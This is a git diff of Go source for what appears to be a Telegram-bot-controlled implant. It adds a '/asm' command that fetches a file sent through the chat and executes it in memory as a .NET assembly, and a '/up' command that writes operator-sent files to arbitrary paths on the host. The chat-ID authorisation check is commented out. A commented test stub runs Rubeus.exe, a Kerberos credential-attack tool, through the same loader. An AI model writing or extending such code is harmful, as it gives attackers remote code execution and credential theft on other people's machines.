@@ -53,27 +53,38 @@ func main() {
 			chatID := update.Message.Chat.ID
 			text := update.Message.Text
 			file := update.Message.Document
-			filePath := update.Message.Caption
-			fileName := update.Message.Document.FileName
+			caption := update.Message.Caption
 			// if contains(chatIDs, chatID) {
+				var responseText string
 				if file != nil {
-					// Gonna download a file from the bot
-					var responseText string
-					err := downloadFile(file, filePath)
-					if err != nil {
-						// Caption is bad file path, let's try file name in current folder
-						err = downloadFile(file, fileName)
-						if err != nil {
-							responseText = "Could not save file"
-						} else {
-							responseText = "Saved: " + fileName
+					if strings.HasPrefix(caption, "/asm") {
+						// Gonna execute assembly
+						assemblyBytes, err := downloadFileBytes(file)
+						if err == nil {
+							assemblyArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
+							executeAssembly(chatID, assemblyBytes, assemblyArgs, "")
 						}
-					} else {
-						responseText = "Saved: " + filePath
+						continue 
+					} else if (strings.HasPrefix(caption, "/up")) {
+						// Gonna download a file from the bot
+						filePath := strings.TrimSpace(caption[3:])
+						err := downloadFile(file, filePath)
+						if err != nil {
+							// Caption is bad file path, let's try original file name in current folder
+							fileName := update.Message.Document.FileName
+							err = downloadFile(file, fileName)
+							if err != nil {
+								responseText = "Could not save file"
+							} else {
+								responseText = "Saved: " + fileName
+							}
+						} else {
+							responseText = "Saved: " + filePath
+						}
+						// Send message and continue to next task
+						SendMessage(chatID, responseText)
+						continue
 					}
-					// Send message and continue to next task
-					SendMessage(chatID, responseText)
-					continue
 				}
 				parseCommand(chatID, text)
 			// } else if md5Hash(text) == passMd5 {
@@ -88,3 +99,11 @@ func main() {
 		}
 	}
 }
+
+
+// func maintest() {
+// 	b, _ := os.ReadFile(`C:\Users\Owner\Desktop\Tools\SharpCollection\NetFramework_4.0_x64\Rubeus.exe`) 
+// 	args := strings.TrimSpace(" klist ")
+// 	fmt.Println(args)
+// 	executeAssembly(0, b, args)
+// }
